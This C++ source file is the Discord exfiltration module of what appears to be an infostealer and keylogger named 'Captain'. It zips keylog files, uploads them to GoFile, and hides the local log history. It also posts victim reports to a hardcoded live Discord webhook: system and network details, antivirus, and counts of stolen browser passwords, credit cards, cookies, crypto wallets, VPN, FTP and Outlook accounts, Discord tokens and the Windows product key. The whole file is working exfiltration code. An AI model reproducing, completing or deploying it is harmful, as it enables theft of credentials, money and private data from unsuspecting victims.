#include "DiscordHook.h"
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include "nlohmann/json.hpp"
#include "Config.h"
#include "GofileFileService.h"
#include "Filemanager.h"
#include <fstream>
#include "Counter.h"
#include "SystemInfo.h"
#include <sstream>
#include "rc4.h"
#include "base64.h"
#include <string>
#include <vector>
#include "Paths.h"
#include "time.h"

using json = nlohmann::json;
#pragma comment(lib, "wininet.lib")

// Suppresses the warning for deprecated experimental filesystem usage in Visual Studio
#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING 

// Includes the experimental filesystem library, used for file and directory manipulations
#include <experimental/filesystem>  

// Creates a shorthand alias for the experimental filesystem namespace
namespace fs = std::experimental::filesystem;

#pragma comment(lib, "wininet.lib")

using json = nlohmann::json;

// Static member variable of DiscordWebHook class to set the maximum number of keylogs
int DiscordHook::MaxKeylogs = 10;

// Creates a path component based on the username, computer name, and system language
std::string PassPath = SystemInfo::getUserName() + "@" + SystemInfo::getComputerName() + "_" + SystemInfo::getLanguage();

// Defines the file path for storing the latest message ID (in the work directory)
// The commented-out line suggests this was initially nested in a user-specific log directory
// std::string DiscordWebHook::LatestMessageIdLocation = Paths::InitWorkDir() + "\\" + PassPath + "\\logs\\msgid.dat";
std::string DiscordHook::LatestMessageIdLocation = Paths::InitWorkDir() + "\\msgid.dat";

// Defines the file path for storing keylogging history (in a nested user-specific directory)
std::string DiscordHook::KeylogHistory = Paths::InitWorkDir() + "\\" +
PassPath + "\\logs\\history.dat";

// Defines a new directory path that combines the work directory and user-specific identifier
std::string NewPath = Paths::InitWorkDir() + "\\" + PassPath + "\\";

// Function to set the latest message ID and save it to a file
void DiscordHook::SetLatestmessageId(std::string id)
{
    try
    {
        // Creates and opens an output file stream to write the ID to the specified location
        std::ofstream outputFile(LatestMessageIdLocation);

        // Writes the provided ID into the file
        outputFile << id;

        // Closes the file stream to ensure data is saved
        outputFile.close();
    }
    catch (const std::exception&)  // Catches any exception thrown during the file operation
    {
        // Throws a runtime error with a custom message if file operations fail
        throw std::runtime_error("An error occurred while writing to file: ");
    }
}

// Function to read the entire content of a text file and return it as a string
std::string ReadAllText(const std::string filePath)
{
    // Opens the file for reading
    std::ifstream inputFile(filePath);

    // Checks if the file is accessible and readable. If true, reads its contents into a string
    // Uses stream iterators to read the entire file content into a string
    return inputFile.good() ? std::string(std::istreambuf_iterator<char>(inputFile), {}) : "-1";
    // If the file cannot be opened, return "-1" to indicate an error
}

// Function to retrieve the latest message ID from the stored file
std::string DiscordHook::GetLatestmessageId()
{
    // Reads the content of the file specified by LatestMessageIdLocation
    std::string str = ReadAllText(LatestMessageIdLocation);

    // Checks if the read content is empty or "-1" (indicating an error or no content)
    if (str.empty() || str == "-1")
    {
        // Returns "-1" to signal an error or missing data
        return "-1";
    }

    // Returns the content of the file (assumed to be the latest message ID)
    return str;
}

// Function to extract the "id" field from a JSON response string
std::string DiscordHook::GetMessageId(std::string response)
{
    try {
        // Parses the input string into a JSON object
        json data = json::parse(response);

        // Checks if the "id" field exists and is of type string
        if (data.find("id") != data.end() && data["id"].is_string()) {
            // Retrieves the value of the "id" field as a string
            std::string id_value = data["id"].get<std::string>();
            return id_value;  // Returns the extracted ID
        }
    }
    catch (const std::exception& e) {  // Catches JSON parsing errors
        // Prints an error message to the console if JSON parsing fails
        std::cout << "JSON parsing error: " << e.what() << std::endl;
    }

    // Implicitly returns an empty string if parsing or extraction fails
}

std::string DiscordHook::getRequest(const std::string& url) {

    std::string response;
    HINTERNET hInternet = InternetOpenA("HTTPGET", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

    if (!hInternet) {
        std::cerr << "Failed to initialize WinINet." << std::endl;
        return response;
    }

    // Parse the URL to get the host and path
    URL_COMPONENTSA urlComponents = {};
    char host[256] = {};
    char path[2048] = {};
    urlComponents.dwStructSize = sizeof(urlComponents);
    urlComponents.lpszHostName = host;
    urlComponents.dwHostNameLength = sizeof(host);
    urlComponents.lpszUrlPath = path;
    urlComponents.dwUrlPathLength = sizeof(path);

    if (!InternetCrackUrlA(url.c_str(), 0, 0, &urlComponents)) {
        std::cerr << "Failed to parse URL." << std::endl;
        InternetCloseHandle(hInternet);
        return response;
    }

    // Open a connection to the server
    HINTERNET hConnect = InternetConnectA(hInternet, host, urlComponents.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

    if (!hConnect) {
        std::cerr << "Failed to connect to host." << std::endl;
        InternetCloseHandle(hInternet);
        return response;
    }
    
    // Specify HTTP request type
    const char* acceptTypes[] = { "*/*", NULL };
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", path, NULL, NULL, acceptTypes, (urlComponents.nScheme == INTERNET_SCHEME_HTTPS) ? INTERNET_FLAG_SECURE : 0, 0);

    if (!hRequest) {
        std::cerr << "Failed to open HTTP request." << std::endl;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return response;
    }

    // Send the HTTP request
    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        std::cerr << "Failed to send HTTP request." << std::endl;
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return response;
    }

    // Read the response data
    char buffer[4096];
    DWORD bytesRead = 0;

    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead != 0) {
        buffer[bytesRead] = '\0';
        response.append(buffer, bytesRead);
    }

    // Cleanup handles
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return response;
}

// Function to get the best GoFile server as a wide string
std::wstring DiscordHook::getBestgofile()
{
    // URL to fetch the best available GoFile server
    std::string url = "https://api.gofile.io/servers";

    // Sends an HTTP GET request to the specified URL and gets the JSON response as a string
    std::string jsonStr = getRequest(url);

    try {
        // Parses the JSON response string
        json jsonData = json::parse(jsonStr);

        // Check if the status is "ok"
        if (jsonData["status"] != "ok") {
            std::cerr << "Error: Status is not 'ok'. Status is: " << jsonData["status"] << std::endl;
            return L"";  // Early return if status is not ok
        }

        // Checks if the "servers" field exists in the "data" object and is an array
        if (jsonData["data"].contains("servers")) {
            auto serverArray = jsonData["data"]["servers"];

            // Check if the array is not empty
            if (!serverArray.empty()) {
                // Check if the "serverName" key exists and is not null in the first element
                if (serverArray[0].contains("name") && !serverArray[0]["name"].is_null()) {
                    std::string server = serverArray[0]["name"];

                    // Convert the server name from UTF-8 to wide string format
                    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
                    std::wstring wserver = converter.from_bytes(server);

                    // Append ".gofile.io" to the server name to complete the URL
                    wserver += L".gofile.io";

                    // Return the full server address
                    return wserver;
                }
            }
        }
    }
    catch (const std::exception& e) {  // Handles JSON parsing or other exceptions
        // Logs the exception to the standard error stream
        std::cerr << "Exception caught: " << e.what() << std::endl;
    }

    return L"";  // Default return value if no valid server is found
}

// Function to validate the Discord webhook
bool DiscordHook::WebhookIsValidAsync()
{
    // Reference to the webhook URL stored in the Config class
    std::string& webhook = Config::Webhook;

    // Initialize a boolean variable to store the validity of the webhook, defaulted to false (invalid)
    bool isValid = false;

    try
    {
        // Initialize a WinINet session with the specified user-agent "DiscordWebhookValidator"
        HINTERNET hInternet = InternetOpenA("DiscordWebhookValidator", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet)
        {
            // Throw an exception if the Internet session could not be initialized
            throw std::runtime_error("Failed to initialize WinINet.");
        }

        // Open a URL session to the webhook URL with flags to bypass cache and reload the resource
        HINTERNET hConnect = InternetOpenUrlA(hInternet, webhook.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (!hConnect)
        {
            // If the URL session couldn't be opened, close the Internet session handle and throw an exception
            InternetCloseHandle(hInternet);
            throw std::runtime_error("Failed to open URL. Error code: " + std::to_string(GetLastError()));
        }

        // Initialize a string to store the HTTP response
        std::string response;
        char buffer[4096];       // Buffer to read data from the HTTP response
        DWORD bytesRead = 0;     // Variable to store the number of bytes read in each iteration

        // Read data from the HTTP response in chunks until no more data is available
        do
        {
            // Attempt to read data into the buffer and check if any bytes were read
            if (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
            {
                // Append the read bytes to the response string
                response.append(buffer, bytesRead);
            }
        } while (bytesRead > 0);  // Continue reading while bytes are still being received

        // Check if the response is empty, indicating no data was received from the webhook
        if (response.empty())
        {
            throw std::runtime_error("No response received from webhook.");
        }

        // Parse the response string as JSON using nlohmann::json
        nlohmann::json jsonData = nlohmann::json::parse(response);

        // Check if the JSON contains a "type" field with a value of 1, indicating a valid webhook
        if (jsonData.find("type") != jsonData.end() && jsonData["type"] == 1)
        {
            isValid = true;  // Set isValid to true if the webhook is valid
        }

        // Close the handles for both the URL session and Internet session to free resources
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
    }
    catch (const std::exception& e)
    {
        // If any exception occurs, log the error message to the console
        std::cout << "Discord >> Invalid Webhook:\n" << e.what() << std::endl;
    }

    // Return the result of the validation check (true if valid, false if invalid)
    return isValid;
}

// Callback function to handle data received from CURL requests
std::size_t DiscordHook::WriteCallback(char* ptr, std::size_t size, std::size_t nmemb, std::string* data)
{
    // Appends the received data to the response string
    data->append(ptr, size * nmemb);
    return size * nmemb;  // Returns the number of bytes processed
}

// Function to send a message to a Discord webhook
std::string DiscordHook::SendMessageAsync(std::string text) {

    // Create the JSON payload
    json newJson;
    newJson["username"] = "CaptainBot";  // Replace with Config::Username if valid
    newJson["avatar_url"] = "https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/UHFbanner-MSlogo?fmt=png-alpha&bfc=off&qlt=100,1";
    newJson["content"] = text;
    std::string payload = newJson.dump();

    std::string response;

    // Open an internet connection
    HINTERNET hInternet = InternetOpenA("DiscordWebhookClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "InternetOpenA failed: " << GetLastError() << std::endl;
        return "InternetOpenA failed";
    }

    // Connect to the server
    HINTERNET hConnect = InternetConnectA(hInternet, "discordapp.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        std::cerr << "InternetConnectA failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hInternet);
        return "InternetConnectA failed";
    }

    // Create a POST request
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/webhooks/1309779606127251497/oNEo7ziD8V0G7iCQIIgBa-1rYU9iDNtW5nAJijyVrdNziLd39blTHXyw2MAnnNNVUDh1", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        std::cerr << "HttpOpenRequestA failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "HttpOpenRequestA failed";
    }

    // Set headers
    const char* headers = "Content-Type: application/json";

    // Send the request
    BOOL success = HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)payload.c_str(), payload.size());
    if (!success) {
        std::cerr << "HttpSendRequestA failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "HttpSendRequestA failed";
    }

    //// Read the server's response
    //char buffer[4096];
    //DWORD bytesRead = 0;

    //while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead != 0) {
    //    buffer[bytesRead] = '\0';  // Null-terminate the buffer
    //    response += buffer;
    //}

    //// Clean up
    //InternetCloseHandle(hRequest);
    //InternetCloseHandle(hConnect);
    //InternetCloseHandle(hInternet);

    return "";

}

// Helper function to remove the file name from a file path, returning only the directory path
std::string RemoveFileName(const std::string& filePath) {
    size_t found = filePath.find_last_of("\\/");  // Find the last directory separator
    if (found != std::string::npos) {
        return filePath.substr(0, found);  // Return the substring up to the separator
    }
    else {
        std::cerr << "Failed to remove file name from path." << std::endl;
        return "";  // Return an empty string if no separator is found
    }
}

// Function to upload keylog files to a server
void DiscordHook::UploadKeylogs() {
    // Get the directory path containing keylog history
    std::string log = RemoveFileName(KeylogHistory);

    // Check if the directory exists; return if it doesn't
    DWORD attr = GetFileAttributes(log.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES) {
        return;
    }

    // Get the current system time to generate a unique file name
    SYSTEMTIME st;
    GetLocalTime(&st);
    char filename[MAX_PATH];
    sprintf_s(filename, MAX_PATH, "%04d-%02d-%02d_%02d%02d%02d",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    // Archive the log files into a compressed format
    bool archive = Filemanager::zip_add_to_archive(log);

    // Move the compressed file to a new path with a unique name
    BOOL ret = MoveFileA((log + ".gz").c_str(), ((NewPath + filename) + ".gz").c_str());
    if (ret) {
        std::cout << "File renamed successfully" << std::endl;
    }
    else {
        std::cerr << "Failed to rename file: " << GetLastError() << std::endl;
        return;
    }

    // Construct the full path for the compressed file
    std::string fullPath = NewPath + filename + ".gz";

    // Upload the file to a server and get the file's URL
    std::string urlPath = GofileFileService::UploadFileAsync(fullPath);

    // Delete the local copy of the uploaded file
    DeleteFile((((NewPath + filename)) + ".gz").c_str());

    // Open the keylog history file in append mode and write the log details
    std::ofstream ofs(DiscordHook::KeylogHistory.c_str(), std::ios::app | std::ios::binary);
    if (ofs.good()) {
        ofs.write(((NewPath + filename) + ".gz").data(), (((NewPath + filename) + ".gz").size()));
        ofs.write("\t", 1);  // Write a tab character
        ofs.write(urlPath.data(), urlPath.size());  // Write the file's URL
        ofs.write("\r\n", 2);  // Write a newline
        ofs.close();

        std::cout << "File created and written successfully." << std::endl;
    }
    else {
        std::cerr << "Failed to create file." << std::endl;
    }

    // Hide the keylog history file by setting its hidden attribute
    SetFileAttributes(DiscordHook::KeylogHistory.c_str(), FILE_ATTRIBUTE_HIDDEN);
}

// Function to retrieve a history of keylog entries
std::string DiscordHook::GetKeylogsHistory() {
    const int MaxKeylogs = 10; // Maximum number of keylog entries to retrieve

    // Open the keylog history file
    std::ifstream ifs(DiscordHook::KeylogHistory.c_str());
    if (!ifs.is_open()) {
        // Return a space if the file could not be opened
        return " ";
    }

    std::vector<std::string> logs; // Vector to store each line of the log file
    std::string line;

    // Read the file line by line and store each line in the logs vector
    while (std::getline(ifs, line)) {
        logs.push_back(line);
    }
    ifs.close(); // Close the file stream after reading

    int count = logs.size(); // Total number of log entries
    int start = (count > MaxKeylogs) ? count - MaxKeylogs : 0; // Determine the starting index for the recent logs
    std::vector<std::string> recent_logs(logs.begin() + start, logs.end()); // Extract the most recent entries

    // If the log count equals the max limit, indicate it; otherwise, include the total count
    std::string len = (count == MaxKeylogs) ? "(Count - MAX)" : "(" + std::to_string(count) + ")";

    std::string data;
    // Concatenate all recent logs into a single string, separated by newlines
    for (const auto& log : recent_logs) {
        data += log + "\n";
    }

    // Construct the final result string with a header and the concatenated logs
    std::string result = "\n\t- Keylogger: " + len + ":\n" + data + "\n";
    return result; // Return the constructed log history string
}

void DiscordHook::SendSystemInfoAsync(std::string url) {
    // Collect information about different detected services
    std::string bankServices = Counter::getLValue("Banking services", Counter::DetectedBankingServices, '-');
    std::string CryptServices = Counter::getLValue("Cryptocurrency services", Counter::DetectedCryptoServices, '-');

    // Use a stringstream to build the report string for better efficiency
    std::stringstream ss;
    ss << std::string("")
        + "\n\Captain - Report:" // Header of the report
        + "\n- Date: " + SystemInfo::getDateTime() // Current date and time
        + "\n- System: " + SystemInfo::getSystemVersion() // System version
        + "\n- Username: " + SystemInfo::getUserName() // Username
        + "\n- CompName: " + SystemInfo::getComputerName() // Computer name
        + "\n- Language: " + SystemInfo::getLanguage() // System language
        + "\n- Antivirus: " + "\t" + SystemInfo::getAntivirus() // Antivirus information
        + "\n\n"
        + std::string("Hardware:") // Section for hardware information
        + "\n- CPU: " + SystemInfo::getCpuName() // CPU name
        + "\n- GPU: " + SystemInfo::getGpuName() // GPU name
        + "\n- RAM: " + SystemInfo::getRamAmount() // Amount of RAM
        + "\n- Power: " + SystemInfo::getBattery() // Battery status
        + "\n- Screen: " + SystemInfo::getScreenMetrics() // Screen resolution
        + "\n\n"
        + std::string("Network:") // Section for network information
        + "\n- Gateway IP: " + SystemInfo::getDefaultGateway() // Default gateway IP
        + "\n- Internal IP: " + SystemInfo::getLocalIp() // Local/internal IP
        + "\n- External IP: " + SystemInfo::getPublicIpAsync() // External/public IP
        + "\n\n"
        + std::string("Domains info:") // Section for domain-related detections
        + bankServices
        + "- " + CryptServices
        //+ "- " + DetectServices
        + "\n\n"
        + std::string("Browsers:") // Section for browser-related data
        + Counter::getIValue("- Passwords: ", Counter::Passwords)
        + Counter::getIValue("- CreditCards: ", Counter::CreditCards)
        + Counter::getIValue("- Cookies: ", Counter::Cookies)
        + Counter::getIValue("- AutoFill: ", Counter::AutoFill)
        + Counter::getIValue("- History: ", Counter::History)
        + Counter::getIValue("- Downloads: ", Counter::Downloads)
        + Counter::getIValue("- Wallet Extensions: ", Counter::BrowserWallets)
        + "\n\n"
        + "Software: " // Section for installed software and sessions
        + Counter::getIValue("- Wallets", Counter::Wallets)
        + Counter::getIValue("- FTP hosts", Counter::FtpHosts)
        + Counter::getIValue("- VPN accounts", Counter::Vpn)
        + Counter::getSValue("- Outlook accounts", Counter::Outlook)
        + Counter::getSValue("- Discord token", Counter::Discord)
        + "\n\n"
        + "Device:" // Section for device-related details
        + Counter::getSValue("- Windows product key", Counter::ProductKey)
        + "\n\n"
        + "File Grabber:" + // Section for file grabbing
        (Config::GrabberModule != "1" ? "\n- Disabled in configuration" : "\n- Enable in configuration")
        + Counter::getIValue("- Images", Counter::GrabberImages)
        + Counter::getIValue("- Documents", Counter::GrabberDocuments)
        + Counter::getIValue("- Database files", Counter::GrabberDatabases)
        + Counter::getIValue("- Source code files", Counter::GrabberSourceCodes)
        + "\n\n"
        + "Archive download link: " + "\t" + url;

    std::string info = ss.str(); // Final report as a string
    SendMessageAsync(info); // Send the report via the webhook
}

 //Function to send a report asynchronously, including uploading a file and sending system info
void DiscordHook::SendReportAsync(std::string file) {
    try {
        // Upload the specified file asynchronously using the GofileFileService and get the file URL
        std::string url = GofileFileService::UploadFileAsync(file);

        // If the file was successfully uploaded (non-empty URL), send system info with the file URL
        if (!url.empty()) {
            SendSystemInfoAsync(url); // Send system info with the URL from the uploaded file
        }

    }
    catch (const std::exception&) {
        // If any exception occurs during the try block, simply catch and ignore the exception
        // (In a real scenario, you might log the error or take other actions)
    }

    // Delete the uploaded file after processing, regardless of success or failure
    Filemanager::DeleteFileOrDir(file); // Ensure the file is deleted after it is uploaded
}

// Function to remove the filename from a given path, leaving only the directory path
std::string RemoveFileNameFromPath(const std::string& path) {
    // Find the position of the last slash or backslash to locate the end of the directory path
    std::size_t found = path.find_last_of("/\\");

    // If a directory separator is found, process the string to extract the directory part
    if (found != std::string::npos) {
        // Extract the directory path by taking the substring up to the separator
        std::string directory = path.substr(0, found);

        // Find the position of the last character that is not a separator in the directory string
        std::size_t found2 = directory.find_last_not_of("/\\");

        // If such a character is found, return the substring up to and including that character
        if (found2 != std::string::npos) {
            return directory.substr(0, found2 + 1); // Include the final character in the directory path
        }
    }

    // If no separators or valid directory are found, return an empty string (indicating no directory)
    return "";
}

// Function to calculate the total size of a folder, including its subdirectories and files
uintmax_t GetFolderSize(const fs::path& folderPath) {
    uintmax_t size = 0; // Initialize the size accumulator to 0

    // Iterate through each entry in the folder and its subdirectories
    for (const auto& entry : fs::recursive_directory_iterator(folderPath)) {
        // Check if the current entry is a regular file (not a directory or symbolic link)
        if (fs::is_regular_file(entry)) {
            // Add the size of the file to the total size
            size += fs::file_size(entry);
        }
    }

    // Return the total size of all the files in the folder and its subdirectories
    return size;
}

// Function to check the size of a directory and take action if it exceeds a threshold
void DiscordHook::CheckDirectorySize(std::string directoryPath) {
    try {
        // Get the total size of the directory using the GetFolderSize function
        uintmax_t folderSize = GetFolderSize(directoryPath);

        // If the folder size exceeds 100MB (104857600 bytes), take action
        if (folderSize > 104857600) {
            // Attempt to add the directory to a zip archive
            bool is_sucess = Filemanager::zip_add_to_archive(directoryPath);

            // Construct the path for the archive file by appending ".gz" to the original directory name
            std::string archivepath = directoryPath + ".gz";

            // Send the report with the file path of the created archive (in .gz format)
            DiscordHook::SendReportAsync(directoryPath + ".gz");

            // Delete the original directory after it has been archived and reported
            Filemanager::DeleteFileOrDir(directoryPath);
        }

    }
    catch (fs::filesystem_error& e) {
        // If any filesystem error occurs (e.g., invalid directory path), print the error message
        std::cout << "Error occurred while checking directory size: " << e.what() << std::endl;
    }
}

// Function to periodically check and transmit keylogger data from the specified directory
void DiscordHook::TimedTransmissionKeylogger() {
    // Remove the file name from the keylog history path, leaving only the directory path
    std::string KeyloggfilePath = RemoveFileNameFromPath(DiscordHook::KeylogHistory);

    // Infinite loop to check the directory size and send data periodically
    while (true) {
        // Sleep for 1 minute (60000 milliseconds) before checking again
        Time::randomDelay();


        // Check the directory size and take action if needed (e.g., if it exceeds 100MB)
        CheckDirectorySize(KeyloggfilePath);
    }
}
